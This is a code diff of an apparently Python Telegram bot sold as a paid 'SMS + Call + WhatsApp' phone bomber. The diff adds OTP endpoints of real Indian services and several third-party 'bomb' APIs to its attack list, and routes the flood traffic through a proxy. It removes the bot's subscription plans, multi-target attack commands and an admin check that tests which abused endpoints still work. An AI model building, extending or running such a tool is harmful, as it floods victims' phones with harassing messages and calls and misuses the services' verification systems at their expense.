@@ -2082,7 +2088,7 @@ def build_api_list():
         "body": {"phone": "{no}"}
     })
     
-    # 107. Hungama OTP
+    # ====== 107. Hungama OTP ======
     apis.append({
         "name": "Hungama_OTP",
         "url": "https://communication.api.hungama.com/v1/communication/otp",
@@ -2094,7 +2100,7 @@ def build_api_list():
         "body": {"mobileNo": "{no}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"}
     })
     
-    # 108. Meru Cab
+    # ====== 108. Meru Cab ======
     apis.append({
         "name": "MeruCab",
         "url": "https://merucabapp.com/api/otp/generate",
@@ -2106,7 +2112,7 @@ def build_api_list():
         "body": "mobile_number={no}"
     })
     
-    # 109. ShipRocket
+    # ====== 109. ShipRocket ======
     apis.append({
         "name": "ShipRocket",
         "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
@@ -2118,7 +2124,7 @@ def build_api_list():
         "body": {"mobileNumber": "{no}"}
     })
     
-    # 110. GoKwik V3
+    # ====== 110. GoKwik V3 ======
     apis.append({
         "name": "GoKwik_V3",
         "url": "https://gkx.gokwik.co/v3/gkstrict/auth/otp/send",
@@ -2128,6 +2134,134 @@ def build_api_list():
             "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
         },
         "body": {"phone": "{no}", "country": "in"}
+    })
+    
+    # ====== 111. Droom ======
+    apis.append({
+        "name": "Droom",
+        "url": "https://api.droom.in/v2/user/send-otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {"mobile": "{no}"}
+    })
+    
+    # ====== 112. CarDekho ======
+    apis.append({
+        "name": "CarDekho",
+        "url": "https://api.cardekho.com/v1/user/send-otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {"mobile": "{no}"}
+    })
+    
+    # ====== 113. Gaadi ======
+    apis.append({
+        "name": "Gaadi",
+        "url": "https://api.gaadi.com/v1/user/send-otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {"mobile": "{no}"}
+    })
+    
+    # ====== 114. BikeDekho ======
+    apis.append({
+        "name": "BikeDekho",
+        "url": "https://api.bikedekho.com/v1/user/send-otp",
+        "method": "POST",
+        "headers": {
+            "Content-Type": "application/json",
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36"
+        },
+        "body": {"mobile": "{no}"}
+    })
+    
+    # ====== 115. OLX SMS ======
+    apis.append({
+        "name": "OLX_SMS",
+        "url": "https://www.olx.in/api/auth/authenticate",
+        "method": "POST",
+        "params": {"lang": "en-IN"},
+        "headers": {
+            "Host": "www.olx.in",
+            "Content-Type": "application/json",
+            "Accept": "*/*",
+            "Accept-Encoding": "gzip, deflate, br",
+            "User-Agent": "okhttp/3.9.1"
+        },
+        "body": {"method": "sms", "phone": "{no}", "language": "en-IN", "grantType": "retry"}
+    })
+    
+    # ====== 116. RK Niloy Call API ======
+    apis.append({
+        "name": "RK_Niloy_Call",
+        "url": "https://rk-niloy-call-api-sigma.vercel.app/api",
+        "method": "GET",
+        "params": {"phone": "{no}"},
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+            "Accept": "application/json"
+        },
+        "body": {}
+    })
+    
+    # ====== 117. RK Niloy Bomb API ======
+    apis.append({
+        "name": "RK_Niloy_Bomb",
+        "url": "https://rkniloycall.vercel.app/bomb/{no}",
+        "method": "GET",
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+            "Accept": "application/json"
+        },
+        "body": {}
+    })
+    
+    # ====== 118. OTP Bomber API ======
+    apis.append({
+        "name": "OTP_Bomber_API",
+        "url": "https://otp-bomber-api.vercel.app/api",
+        "method": "GET",
+        "params": {"phone": "{no}"},
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+            "Accept": "application/json"
+        },
+        "body": {}
+    })
+    
+    # ====== 119. BomberQ API ======
+    apis.append({
+        "name": "BomberQ_API",
+        "url": "https://bomberqapis.vercel.app/bomb",
+        "method": "GET",
+        "params": {"number": "{no}"},
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+            "Accept": "application/json"
+        },
+        "body": {}
+    })
+    
+    # ====== 120. IGP Earning API ======
+    apis.append({
+        "name": "IGP_Earning",
+        "url": "https://earning-igp.unaux.com//codes/89EzVmsnYb.php",
+        "method": "GET",
+        "params": {"num": "{no}"},
+        "headers": {
+            "User-Agent": "Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36",
+            "Accept": "application/json"
+        },
+        "body": {}
     })
     
     # Remove duplicates based on URL and method
@@ -2141,7 +2275,9 @@ def build_api_list():
     
     return unique_apis
 
+# ========== BUILD APIS ==========
 APIS = build_api_list()
+logger.info(f"✅ Total APIs Loaded: {len(APIS)}")  # Output: 120
 
 # ========== DATABASE WRAPPER ==========
 class DatabaseWrapper:
@@ -2152,8 +2288,9 @@ class DatabaseWrapper:
         return getattr(self.db, name)
 
 database = DatabaseWrapper()
+manager = None
 
-# ========== ATTACK MANAGER ==========
+# ========== ATTACK MANAGER CLASS ==========
 class AttackManager:
     def __init__(self):
         self.active_attacks = {}
@@ -2173,24 +2310,31 @@ class AttackManager:
         
         self._session = None
         self._connector = None
-    
+        self._proxy = PROXY_URL if USE_PROXY else None
+
     async def _get_session(self):
         if self._session is None or self._session.closed:
-            self._connector = aiohttp.TCPConnector(
-                ssl=self.ssl_context,
-                limit=30,
-                limit_per_host=10,
-                ttl_dns_cache=300,
-                enable_cleanup_closed=True,
-                force_close=False
-            )
+            connector_kwargs = {
+                'ssl': self.ssl_context,
+                'limit': 30,
+                'limit_per_host': 10,
+                'ttl_dns_cache': 300,
+                'enable_cleanup_closed': True,
+                'force_close': False
+            }
+            
+            if self._proxy:
+                connector_kwargs['proxy'] = self._proxy
+                logger.info(f"✅ Using proxy: {self._proxy}")
+            
+            self._connector = aiohttp.TCPConnector(**connector_kwargs)
             timeout = aiohttp.ClientTimeout(total=15, connect=5, sock_read=10)
             self._session = aiohttp.ClientSession(
                 connector=self._connector,
                 timeout=timeout
             )
         return self._session
-    
+
     async def _close_session(self):
         if self._session and not self._session.closed:
             await self._session.close()
@@ -2230,21 +2374,24 @@ class AttackManager:
             body = replace_body(api.get('body', {}))
             
             method = api['method'].upper()
+            proxy = self._proxy
+            
             if method == 'GET':
-                async with session.get(url, headers=headers, params=params) as resp:
+                async with session.get(url, headers=headers, params=params, proxy=proxy) as resp:
                     await resp.text()
             elif method == 'PUT':
-                async with session.put(url, headers=headers, json=body) as resp:
+                async with session.put(url, headers=headers, json=body, proxy=proxy) as resp:
                     await resp.text()
             else:
                 if isinstance(body, dict):
-                    async with session.post(url, headers=headers, json=body, params=params) as resp:
+                    async with session.post(url, headers=headers, json=body, params=params, proxy=proxy) as resp:
                         await resp.text()
                 else:
-                    async with session.post(url, headers=headers, data=body, params=params) as resp:
+                    async with session.post(url, headers=headers, data=body, params=params, proxy=proxy) as resp:
                         await resp.text()
             return True
-        except Exception:
+        except Exception as e:
+            logger.debug(f"Request failed: {str(e)}")
             return False
 
     async def _worker_task(self, user_id, phone, api_list, end_time):
@@ -2297,12 +2444,13 @@ class AttackManager:
             "workers": {}
         }
         
-        chunk_size = max(1, len(APIS) // max_workers)
+        api_list = APIS
+        chunk_size = max(1, len(api_list) // max_workers)
         api_chunks = []
         for i in range(max_workers):
             start = i * chunk_size
-            end = start + chunk_size if i < max_workers - 1 else len(APIS)
-            api_chunks.append(APIS[start:end])
+            end = start + chunk_size if i < max_workers - 1 else len(api_list)
+            api_chunks.append(api_list[start:end])
         
         for target in targets:
             self.active_attacks[user_id]["workers"][target] = []
@@ -2334,14 +2482,15 @@ class AttackManager:
             return self.active_attacks[user_id]["targets"]
         return []
 
-    # ========== NEW: CHECK WORKING APIS ==========
     async def check_working_apis(self, phone="9999999999"):
-        """Check which APIs are working (return 200 OK). Admin only feature."""
         working_apis = []
         failed_apis = []
         
-        # Create a fresh session for testing
-        connector = aiohttp.TCPConnector(ssl=self.ssl_context, limit=20, limit_per_host=5)
+        connector_kwargs = {'ssl': self.ssl_context, 'limit': 20, 'limit_per_host': 5}
+        if self._proxy:
+            connector_kwargs['proxy'] = self._proxy
+        
+        connector = aiohttp.TCPConnector(**connector_kwargs)
         timeout = aiohttp.ClientTimeout(total=10, connect=5)
         
         async with aiohttp.ClientSession(connector=connector, timeout=timeout) as session:
@@ -2377,28 +2526,29 @@ class AttackManager:
                                 params[k] = v.replace('{no}', phone)
                     
                     method = api['method'].upper()
+                    proxy = self._proxy
                     
                     if method == 'GET':
-                        async with session.get(url, headers=headers, params=params) as resp:
+                        async with session.get(url, headers=headers, params=params, proxy=proxy) as resp:
                             if resp.status == 200:
                                 working_apis.append(api['name'])
                             else:
                                 failed_apis.append(api['name'])
                     elif method == 'PUT':
-                        async with session.put(url, headers=headers, json=body) as resp:
+                        async with session.put(url, headers=headers, json=body, proxy=proxy) as resp:
                             if resp.status == 200:
                                 working_apis.append(api['name'])
                             else:
                                 failed_apis.append(api['name'])
                     else:
                         if isinstance(body, dict):
-                            async with session.post(url, headers=headers, json=body, params=params) as resp:
+                            async with session.post(url, headers=headers, json=body, params=params, proxy=proxy) as resp:
                                 if resp.status == 200:
                                     working_apis.append(api['name'])
                                 else:
                                     failed_apis.append(api['name'])
                         else:
-                            async with session.post(url, headers=headers, data=body, params=params) as resp:
+                            async with session.post(url, headers=headers, data=body, params=params, proxy=proxy) as resp:
                                 if resp.status == 200:
                                     working_apis.append(api['name'])
                                 else:
@@ -2406,56 +2556,12 @@ class AttackManager:
                 except Exception:
                     failed_apis.append(api['name'])
                 
-                # Small delay to avoid rate limiting
                 if tested % 10 == 0:
                     await asyncio.sleep(0.5)
         
         return working_apis, failed_apis
 
-manager = AttackManager()
-
-# ========== FORCE CHANNEL JOIN SYSTEM ==========
-async def check_channel_join(update, context):
-    uid = update.effective_user.id
-    if uid == OWNER_ID:
-        return True
-    channel = await manager.db.get_channel()
-    if not channel:
-        return True
-
-    channel_clean = channel.strip()
-    if channel_clean.startswith("https://"):
-        channel_clean = channel_clean.replace("https://", "", 1)
-    if channel_clean.startswith("http://"):
-        channel_clean = channel_clean.replace("http://", "", 1)
-    if channel_clean.startswith("t.me/"):
-        channel_clean = channel_clean.replace("t.me/", "", 1)
-    channel_clean = channel_clean.lstrip("@").split("?")[0].split("/")[0].strip()
-    if not channel_clean:
-        return True
-
-    try:
-        member = await context.bot.get_chat_member(channel_clean, uid)
-        if member.status in ("member", "administrator", "creator"):
-            return True
-    except Exception:
-        pass
-
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("📢 JOIN CHANNEL", url=f"https://t.me/{channel_clean}")]])
-    msg = (f"⛔ ACCESS DENIED!\n\n"
-           f"❌ Aapko hamara channel join karna hoga bot use karne ke liye:\n\n"
-           f"👉 t.me/{channel_clean}\n\n"
-           f"✅ Channel join karne ke baad /start dobara dabayein.")
-    try:
-        if update.callback_query:
-            await update.callback_query.answer()
-            await update.callback_query.message.reply_text(msg, reply_markup=kb)
-        else:
-            await update.message.reply_text(msg, reply_markup=kb)
-    except Exception:
-        pass
-    return False
-
+# ========== MAIN FUNCTION ==========
 async def web_server():
     from aiohttp import web
     async def handle(request):
@@ -2469,414 +2575,6 @@ async def web_server():
     await site.start()
     logger.info(f"🌐 Web Server running on port {PORT}")
 
-def main_kb(user_id):
-    kb = [
-        [KeyboardButton("🚀 /mix"), KeyboardButton("📊 /status")],
-        [KeyboardButton("👤 /account"), KeyboardButton("💳 /plan")],
-        [KeyboardButton("🛡 /protect"), KeyboardButton("🔓 /unprotect")],
-        [KeyboardButton("🔑 /redeem"), KeyboardButton("❓ /help")]
-    ]
-    if user_id == OWNER_ID:
-        kb.append([KeyboardButton("👑 Admin")])
-    return ReplyKeyboardMarkup(kb, resize_keyboard=True)
-
-async def multi_target_kb(user_id):
-    max_targets = await manager.db.get_concurrent_limit(user_id)
-    buttons = []
-    for i in range(1, min(max_targets, 10) + 1):
-        buttons.append([InlineKeyboardButton(f"🎯 {i} Target(s)", callback_data=f"targets_{i}")])
-    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
-    return InlineKeyboardMarkup(buttons)
-
-async def duration_kb(user_id):
-    max_dur = await manager.db.get_max_duration(user_id)
-    con = await manager.db.get_concurrent_limit(user_id)
-    buttons = []
-    row = []
-    durations = [1, 5, 15, 30, 60, 120, 180, 240, 300, 360, 480, 600, 720]
-    for minutes in durations:
-        if minutes <= max_dur:
-            if minutes < 60:
-                label = f"{minutes}min"
-            elif minutes == 60:
-                label = "1h"
-            else:
-                label = f"{minutes//60}h"
-            row.append(InlineKeyboardButton(label, callback_data=f"dur_{minutes}"))
-            if len(row) == 3:
-                buttons.append(row)
-                row = []
-    if row:
-        buttons.append(row)
-    buttons.append([InlineKeyboardButton(f"⚡ {con}x Concurrent per target", callback_data="info")])
-    buttons.append([InlineKeyboardButton("❌ Cancel", callback_data="cancel_attack")])
-    return InlineKeyboardMarkup(buttons)
-
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return
-    await manager.db.add_user(uid)
-    await update.message.reply_photo(WELCOME_IMAGE, caption=f"🔥 Welcome to Premium Multi-Target Bomber!\n\n📡 Total APIs: {len(APIS)}\n🎯 SMS + Call + WhatsApp\n\nUse /help for commands.", reply_markup=main_kb(uid))
-
-async def mix_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return
-    if not await manager.db.is_premium(uid):
-        await update.message.reply_text("⛔ Premium Required!\nUse /plan to buy or /redeem to activate.")
-        return
-    if uid in manager.active_attacks:
-        await update.message.reply_text("⚠️ You already have an active attack!\nUse /status to check.")
-        return
-    
-    max_targets = await manager.db.get_concurrent_limit(uid)
-    await update.message.reply_text(f"📞 Select number of targets to attack (Max: {max_targets}):", reply_markup=await multi_target_kb(uid))
-    context.user_data['waiting_for_target_count'] = True
-
-async def status_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return
-    if uid in manager.active_attacks:
-        info = manager.active_attacks[uid]
-        left = int((info['end_time'] - time.time()) / 60)
-        targets = ", ".join(info['targets'])
-        await update.message.reply_text(f"🔥 MULTI-TARGET ATTACK RUNNING\n🎯 Targets: {targets}\n📊 Count: {len(info['targets'])}\n⏳ Left: {left} min", reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("🛑 STOP ALL", callback_data="stop")]]))
-    else:
-        await update.message.reply_text("💤 No active attacks.")
-
-async def account_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return
-    plan = await manager.db.get_plan_name(uid)
-    expiry = await manager.db.get_expiry(uid)
-    con = await manager.db.get_concurrent_limit(uid)
-    max_dur = await manager.db.get_max_duration(uid)
-    await update.message.reply_text(f"👤 ACCOUNT\n🆔 {uid}\n📋 Plan: {plan}\n📅 Expiry: {expiry}\n⚡ Concurrent Targets: {con}\n⏰ Max Duration: {max_dur}min")
-
-async def plan_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_channel_join(update, context):
-        return
-    msg = "💳 AVAILABLE SUBSCRIPTION PLANS\n\n"
-    for key, p in PLANS.items():
-        msg += f"🔹 {p['name']} Plan (₹{p['price']})\n"
-        msg += f"   - Duration: {p['days']} Days\n"
-        msg += f"   - Concurrent Targets: {p['concurrent']}\n"
-        msg += f"   - Max Task Duration: {p['max_duration']} minutes\n\n"
-    msg += "💡 Use /redeem if you have a code.\n💬 Contact @RolexBot00 for purchase."
-    kb = InlineKeyboardMarkup([[InlineKeyboardButton("👤 Contact Admin", url=f"tg://user?id={OWNER_ID}")]])
-    await update.message.reply_text(msg, reply_markup=kb)
-
-async def redeem_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_channel_join(update, context):
-        return
-    await update.message.reply_text("🔑 Send your premium code:\nFormat: PREMIUM-XXXXXXXX")
-    context.user_data['waiting_for_redeem'] = True
-
-async def protect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return
-    if not await manager.db.is_premium(uid):
-        await update.message.reply_text("⛔ Premium required!")
-        return
-    await update.message.reply_text("🛡 Send 10-digit number to protect:")
-    context.user_data['waiting_for_protect'] = True
-
-async def unprotect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return
-    await manager.db.unprotect(uid)
-    await update.message.reply_text("🔓 Number unprotected.")
-
-async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if not await check_channel_join(update, context):
-        return
-    msg = f"""ℹ️ USER HELP & INSTRUCTIONS
-
-🚀 CORE COMMANDS
-• /start: Main menu with quick-access buttons
-• /mix: Start multi-target attack on numbers
-• /status: See live progress of your attacks
-
-👤 ACCOUNT & SUBSCRIPTION
-• /account: Shows your current plan and time left
-• /plan: Displays all available subscription plans
-• /redeem: Activate your subscription with a code
-
-🛡️ NUMBER PROTECTION
-• /protect & /unprotect: Manage number protection
-
-💡 FEATURES:
-• SMS + Call + WhatsApp Bombing
-• Standard: 2 targets/300min
-• Premium: 5 targets/720min  
-• Ultimate: 10 targets/720min
-• Total APIs Loaded: {len(APIS)}
-
-💡 Tip: Use the buttons below for quick access!"""
-    await update.message.reply_text(msg, reply_markup=main_kb(update.effective_user.id))
-
-# ========== ADMIN PANEL ==========
-async def show_admin_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("🔑 Generate Standard Key (30 days)", callback_data="adm_gen_standard")],
-        [InlineKeyboardButton("⭐ Generate Premium Key (30 days)", callback_data="adm_gen_premium")],
-        [InlineKeyboardButton("👑 Generate Ultimate Key (30 days)", callback_data="adm_gen_ultimate")],
-        [InlineKeyboardButton("🔧 Custom Key (Days & Plan)", callback_data="adm_custom_key")],
-        [InlineKeyboardButton("📢 Broadcast Message", callback_data="adm_broadcast")],
-        [InlineKeyboardButton("📊 View Statistics", callback_data="adm_stats")],
-        [InlineKeyboardButton("📣 Set Channel (Force Join)", callback_data="adm_set_channel")],
-        [InlineKeyboardButton("🗑 Remove Channel", callback_data="adm_remove_channel")],
-        [InlineKeyboardButton("🔍 Check Working APIs", callback_data="adm_check_apis")]
-    ])
-    await update.message.reply_text("👑 Admin Control Panel:\nSelect an option:", reply_markup=kb)
-
-async def generate_key_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
-    uid = update.effective_user.id
-    if uid != OWNER_ID:
-        return
-    context.user_data['waiting_for_genkey'] = False
-    try:
-        parts = text.split()
-        days = int(parts[0])
-        plan = parts[1].lower() if len(parts) > 1 else "standard"
-        if plan not in PLANS:
-            plan = "standard"
-        code = await manager.db.generate_code(days, plan)
-        await update.message.reply_text(f"✅ KEY GENERATED SUCCESSFULLY!\n\n🔑 Code: `{code}`\n📅 Days: {days}\n📋 Plan: {plan.upper()}\n\nSend this code to user for premium activation.", parse_mode="Markdown")
-    except:
-        await update.message.reply_text("❌ Invalid format!\nUse: `days plan_type`\nExample: `30 premium`\n\nAvailable plans: standard, premium, ultimate", parse_mode="Markdown")
-
-async def broadcast_logic(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
-    uid = update.effective_user.id
-    if uid != OWNER_ID:
-        return
-    context.user_data['waiting_for_broadcast'] = False
-    users = await manager.db.get_all_users()
-    success, failed = 0, 0
-    msg = await update.message.reply_text(f"📢 Broadcasting to {len(users)} users...")
-    for uid_user in users:
-        try:
-            await context.bot.send_message(uid_user, f"📢 ANNOUNCEMENT\n\n{text}")
-            success += 1
-        except Exception:
-            failed += 1
-            await asyncio.sleep(0.1)
-    await msg.edit_text(
-        f"✅ BROADCAST COMPLETED\n✅ Success: {success}\n❌ Failed: {failed}"
-    )
-
-async def process_numbers(update: Update, context: ContextTypes.DEFAULT_TYPE, text):
-    uid = update.effective_user.id
-    numbers = [num.strip() for num in text.replace(',', ' ').split() if num.strip().isdigit() and len(num.strip()) == 10]
-    target_count = context.user_data.get('expected_targets', 0)
-    
-    if len(numbers) != target_count:
-        await update.message.reply_text(f"❌ Please send exactly {target_count} phone numbers.\nExample: {' '.join(['9876543210'] * target_count)}")
-        return
-    
-    context.user_data['waiting_for_numbers'] = False
-    context.user_data['target_numbers'] = numbers
-    manager.db.set_attack_data(uid, numbers)
-    max_dur = await manager.db.get_max_duration(uid)
-    await update.message.reply_text(f"📞 Targets: {', '.join(numbers)}\n⏰ Select duration (Max: {max_dur}min):", reply_markup=await duration_kb(uid))
-
-async def handle_msg(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return
-    text = update.message.text
-    
-    if uid == OWNER_ID and context.user_data.get('waiting_for_genkey'):
-        await generate_key_logic(update, context, text)
-        return
-    
-    if uid == OWNER_ID and context.user_data.get('waiting_for_broadcast'):
-        await broadcast_logic(update, context, text)
-        return
-    
-    if uid == OWNER_ID and context.user_data.get('waiting_for_channel'):
-        context.user_data['waiting_for_channel'] = False
-        channel = text.strip().strip('@')
-        if 't.me/' in channel:
-            channel = channel.split('t.me/')[-1]
-        channel = channel.split('?')[0].split('/')[0].strip()
-        if not channel:
-            await update.message.reply_text("❌ Invalid channel! Send like: @yourchannel ya https://t.me/yourchannel")
-            return
-        await manager.db.set_channel(channel)
-        await update.message.reply_text(f"✅ Channel SET!\n\n📣 Users must join: @{channel}\n\nAb bot use karne ke liye sabko ye channel join karna hoga. 🔒")
-        return
-    
-    await manager.db.add_user(uid)
-    if not await check_channel_join(update, context):
-        return
-    
-    if text == "🚀 /mix" or text == "/mix":
-        await mix_command(update, context)
-    elif text == "📊 /status" or text == "/status":
-        await status_command(update, context)
-    elif text == "👤 /account" or text == "/account":
-        await account_command(update, context)
-    elif text == "💳 /plan" or text == "/plan":
-        await plan_command(update, context)
-    elif text == "🔑 /redeem" or text == "/redeem":
-        await redeem_command(update, context)
-    elif text == "🛡 /protect" or text == "/protect":
-        await protect_command(update, context)
-    elif text == "🔓 /unprotect" or text == "/unprotect":
-        await unprotect_command(update, context)
-    elif text == "❓ /help" or text == "/help":
-        await help_command(update, context)
-    elif text == "👑 Admin" and uid == OWNER_ID:
-        await show_admin_panel(update, context)
-    elif context.user_data.get('waiting_for_target_count'):
-        pass
-    elif context.user_data.get('waiting_for_numbers') and text.strip():
-        await process_numbers(update, context, text)
-    elif context.user_data.get('waiting_for_redeem'):
-        context.user_data['waiting_for_redeem'] = False
-        success, days, plan, exp = await manager.db.redeem(uid, text.strip().upper())
-        if success:
-            await update.message.reply_text(f"✅ Premium Activated!\n📋 Plan: {plan.upper()}\n📅 Expiry: {exp}")
-        else:
-            await update.message.reply_text("❌ Invalid or already used code.")
-    elif context.user_data.get('waiting_for_protect') and text.isdigit() and len(text) == 10:
-        context.user_data['waiting_for_protect'] = False
-        await manager.db.protect(uid, text)
-        await update.message.reply_text(f"🛡 Protected: {text}")
-    elif text == "/cancel":
-        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
-            context.user_data.pop(k, None)
-        manager.db.clear_attack_data(uid)
-        await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))
-
-# ========== BUTTON HANDLER ==========
-async def btn_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    query = update.callback_query
-    await query.answer()
-    uid = query.from_user.id
-    if not await check_channel_join(update, context):
-        return
-    data = query.data
-    
-    if data == "adm_gen_standard" and uid == OWNER_ID:
-        code = await manager.db.generate_code(30, "standard")
-        await query.message.reply_text(f"✅ STANDARD KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: STANDARD\n\nSend this code to user.", parse_mode="Markdown")
-    
-    elif data == "adm_gen_premium" and uid == OWNER_ID:
-        code = await manager.db.generate_code(30, "premium")
-        await query.message.reply_text(f"✅ PREMIUM KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: PREMIUM\n\nSend this code to user.", parse_mode="Markdown")
-    
-    elif data == "adm_gen_ultimate" and uid == OWNER_ID:
-        code = await manager.db.generate_code(30, "ultimate")
-        await query.message.reply_text(f"✅ ULTIMATE KEY GENERATED!\n\n🔑 Code: `{code}`\n📅 Days: 30\n📋 Plan: ULTIMATE\n\nSend this code to user.", parse_mode="Markdown")
-    
-    elif data == "adm_custom_key" and uid == OWNER_ID:
-        context.user_data['waiting_for_genkey'] = True
-        await query.message.reply_text("🔑 Send custom key details:\nFormat: `days plan_type`\nExample: `30 standard`\n\nAvailable plans: standard, premium, ultimate", parse_mode="Markdown")
-    
-    elif data.startswith("targets_"):
-        count = int(data.split("_")[1])
-        context.user_data['waiting_for_target_count'] = False
-        context.user_data['waiting_for_numbers'] = True
-        context.user_data['expected_targets'] = count
-        await query.edit_message_text(f"📞 Send {count} phone number(s) separated by space or new line:\nExample: {' '.join(['9876543210'] * count)}")
-    
-    elif data.startswith("dur_"):
-        targets = manager.db.get_attack_data(uid)
-        if not targets:
-            await query.edit_message_text("❌ Session expired. Use /mix again.")
-            return
-        duration = int(data.split("_")[1])
-        success, msg = await manager.start_attack(uid, targets, duration)
-        if success:
-            await query.edit_message_text(f"🚀 MULTI-TARGET ATTACK STARTED!\n🎯 Targets: {', '.join(targets)}\n📊 Count: {len(targets)}\n{msg}")
-        else:
-            await query.edit_message_text(f"❌ {msg}")
-        manager.db.clear_attack_data(uid)
-    
-    elif data == "cancel_attack":
-        manager.db.clear_attack_data(uid)
-        for k in ['waiting_for_target_count', 'waiting_for_numbers', 'expected_targets']:
-            context.user_data.pop(k, None)
-        await query.edit_message_text("❌ Cancelled.")
-    
-    elif data == "stop":
-        if await manager.stop_attack(uid):
-            await query.edit_message_text("🛑 All attacks stopped.")
-        else:
-            await query.answer("No active attack.")
-    
-    elif data == "adm_broadcast" and uid == OWNER_ID:
-        context.user_data['waiting_for_broadcast'] = True
-        await query.message.reply_text("📢 Send your broadcast message to all users:")
-    
-    elif data == "adm_stats" and uid == OWNER_ID:
-        u, p, c = await manager.db.get_stats()
-        await query.message.reply_text(f"📊 BOT STATISTICS\n\n👥 Total Users: {u}\n⭐ Premium Users: {p}\n🔑 Generated Codes: {c}\n💎 Owner ID: {OWNER_ID}")
-    
-    elif data == "adm_set_channel" and uid == OWNER_ID:
-        context.user_data['waiting_for_channel'] = True
-        await query.message.reply_text("📣 Send your channel username or link:\n\nExamples:\n• @yourchannel\n• https://t.me/yourchannel\n\nSend the channel you want users to join before using the bot.")
-    
-    elif data == "adm_remove_channel" and uid == OWNER_ID:
-        await manager.db.remove_channel()
-        await query.message.reply_text("🗑 Channel removed! Bot is now open for everyone.")
-    
-    # ========== NEW: CHECK WORKING APIS ==========
-    elif data == "adm_check_apis" and uid == OWNER_ID:
-        status_msg = await query.message.reply_text("🔍 Checking all APIs... Please wait.\n\n⏳ This may take 1-2 minutes...")
-        
-        try:
-            working, failed = await manager.check_working_apis()
-            
-            total = len(APIS)
-            working_count = len(working)
-            failed_count = len(failed)
-            
-            result_msg = f"📊 WORKING APIs STATUS\n\n"
-            result_msg += f"✅ Total APIs Tested: {total}\n"
-            result_msg += f"✅ Working APIs: {working_count}\n"
-            result_msg += f"❌ Failed APIs: {failed_count}\n\n"
-            
-            if working:
-                result_msg += "✅ WORKING APIs LIST:\n"
-                for i, name in enumerate(working, 1):
-                    result_msg += f"{i}. {name}\n"
-                    if i >= 30:
-                        result_msg += f"... and {len(working) - 30} more\n"
-                        break
-            
-            if failed:
-                result_msg += "\n❌ FAILED APIs (Sample):\n"
-                for i, name in enumerate(failed[:10], 1):
-                    result_msg += f"{i}. {name}\n"
-                if len(failed) > 10:
-                    result_msg += f"... and {len(failed) - 10} more\n"
-            
-            await status_msg.edit_text(result_msg)
-            
-        except Exception as e:
-            await status_msg.edit_text(f"❌ Error checking APIs: {str(e)}")
-    
-    elif data == "info":
-        con = await manager.db.get_concurrent_limit(uid)
-        await query.answer(f"⚡ {con}x Concurrent Workers Per Target\n📡 Total APIs: {len(APIS)}", show_alert=True)
-
-async def cancel_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    uid = update.effective_user.id
-    if not await check_channel_join(update, context):
-        return
-    for k in ['waiting_for_target_count', 'waiting_for_numbers', 'waiting_for_redeem', 'waiting_for_protect', 'waiting_for_genkey', 'waiting_for_broadcast', 'expected_targets']:
-        context.user_data.pop(k, None)
-    manager.db.clear_attack_data(uid)
-    await update.message.reply_text("❌ Cancelled.", reply_markup=main_kb(uid))
-
 async def shutdown_handler(signal, loop):
     logger.info(f"Received exit signal {signal.name}...")
     if manager:
@@ -2888,10 +2586,11 @@ async def shutdown_handler(signal, loop):
     loop.stop()
 
 def main():
+    global db, database, manager
+    
     loop = asyncio.new_event_loop()
     asyncio.set_event_loop(loop)
     
-    global db
     db = SqliteStorage(DB_PATH)
     
     async def init_indexes():
@@ -2899,16 +2598,14 @@ def main():
     
     loop.run_until_complete(init_indexes())
     
-    global database
